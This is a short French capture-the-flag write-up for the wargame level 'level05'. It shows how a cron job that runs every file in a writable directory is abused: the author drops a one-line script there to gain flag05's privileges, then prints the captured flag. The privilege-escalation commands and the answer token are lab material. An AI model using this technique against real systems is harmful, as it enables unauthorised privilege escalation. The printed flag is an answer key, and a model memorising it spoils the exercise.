# level05

## Contexte

Lors de la connexion SSH à `level05`, le système affiche le message "You have new mail", ce qui est un indice qui nous dirige vers `/var/mail`.

## Recherche

On va vérifier le contenu du dossier `/var/mail` :

```bash
cat /var/mail/level05
```

Cela nous montre une tâche cron exécutée par `flag05` :

```text
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

On regarde le contenu du script exécuté automatiquement par le système :

```bash
cat /usr/sbin/openarenaserver
```

Le script exécute tous les fichiers présents dans un dossier accessible :

```text
/opt/openarenaserver/
```

## Vulnérabilité

Le problème vient du fait que le script exécuté par `cron` lance automatiquement tous les fichiers présents dans ce dossier.

Comme on peut écrire dans ce dossier, il est possible de placer notre propre script qui sera exécuté avec les droits de `flag05`.

## Exploitation

On crée un script qui récupère le flag :

```bash
echo "getflag > /tmp/level05.flag" > /opt/openarenaserver/level05.sh
```

On attend l'exécution automatique du cron (toutes les 2 minutes) :

```bash
cat /tmp/level05.flag
```

On obtient :

```text
viuaaale9huek52boumoomioc
```

## Ressources

- `cron`
- Scripts exécutés automatiquement
- Permissions fichiers